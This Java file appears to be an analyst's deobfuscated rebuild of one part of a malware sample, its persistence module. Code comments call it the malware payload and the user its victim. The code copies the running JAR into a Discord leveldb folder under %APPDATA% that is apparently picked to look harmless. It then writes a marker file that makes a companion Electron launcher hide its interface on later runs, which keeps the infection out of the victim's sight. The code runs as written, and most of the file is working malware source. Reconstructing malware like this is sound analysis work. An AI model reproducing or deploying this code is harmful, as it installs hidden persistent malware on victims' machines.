import java.io.File;
import java.net.URI;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

/**
 * Handles self-persistence of the malware payload.
 * Obfuscated names: \u04dd (sender/persistence class), parts of class a
 *
 * Persistence mechanism:
 *  1. Copies modules.lib (the JAR) to a stable location in APPDATA
 *  2. Creates a "marker" file (modules.cache) that the Electron side checks
 *     via checkIntegrity() to know the payload is installed
 *  3. The marker path is: %APPDATA%\discord\Local Storage\leveldb\bin\modules.cache
 *
 * The Electron side (main_clean.js → checkIntegrity()) checks for this file
 * and skips showing the launcher UI if it exists — meaning the victim sees
 * nothing after the first run.
 */
public class PersistenceManager {

    // Persistence target path components (decoded from double-base64 strings)
    // %APPDATA%\discord\Local Storage\leveldb\bin\modules.cache
    private static final String DISCORD_DIR      = "discord";
    private static final String LOCAL_STORAGE    = "Local Storage";
    private static final String LEVELDB_DIR      = "leveldb";
    private static final String BIN_DIR          = "bin";
    private static final String MARKER_FILE      = "modules.cache";

    // The JAR filename to copy (decoded from obfuscated string b[46])
    private static final String JAR_FILENAME     = "modules.lib";

    /**
     * Installs the payload to the persistence location.
     *
     * Steps:
     *  1. Determine source JAR path (current running JAR)
     *  2. Create target directory: %APPDATA%\discord\Local Storage\leveldb\bin\
     *  3. Copy JAR to target as modules.lib
     *  4. Create modules.cache marker file
     *
     * If the JAR is already at the target and same size, skip copy.
     */
    public static void install() {
        try {
            // Build target directory path
            String appData = System.getenv("APPDATA");
            String targetDirPath = appData + "\\" + DISCORD_DIR + "\\" +
                                   LOCAL_STORAGE + "\\" + LEVELDB_DIR + "\\" + BIN_DIR;

            File targetDir = new File(targetDirPath);
            if (!targetDir.exists()) {
                targetDir.mkdirs();
            }

            // Get current JAR location
            File sourceJar = new File(
                PersistenceManager.class.getProtectionDomain()
                    .getCodeSource().getLocation().toURI()
            );

            File targetJar = new File(targetDir, JAR_FILENAME);

            // Only copy if sizes differ (avoid unnecessary writes)
            if (sourceJar != null && (!targetJar.exists() || sourceJar.length() != targetJar.length())) {
                Files.copy(sourceJar.toPath(), targetJar.toPath(), StandardCopyOption.REPLACE_EXISTING);
            }

            // Create marker file (modules.cache)
            // This is what checkIntegrity() in Electron checks for
            File markerFile = new File(targetDir, MARKER_FILE);
            if (!markerFile.exists()) {
                markerFile.createNewFile();
            }

        } catch (Exception ignored) {}
    }

    /**
     * Deletes the persistence marker file.
     *
     * Called before each scan cycle to force the Electron side to show
     * the launcher UI again (so the victim doesn't get suspicious).
     *
     * Wait — actually this is called to RESET the marker so the next
     * Electron launch will re-run the payload check.
     */
    public static void killMarker() {
        try {
            String appData = System.getenv("APPDATA");
            String markerPath = appData + "\\" + DISCORD_DIR + "\\" +
                                LOCAL_STORAGE + "\\" + LEVELDB_DIR + "\\" +
                                BIN_DIR + "\\" + MARKER_FILE;
            new File(markerPath).delete();
        } catch (Exception ignored) {}
    }
}
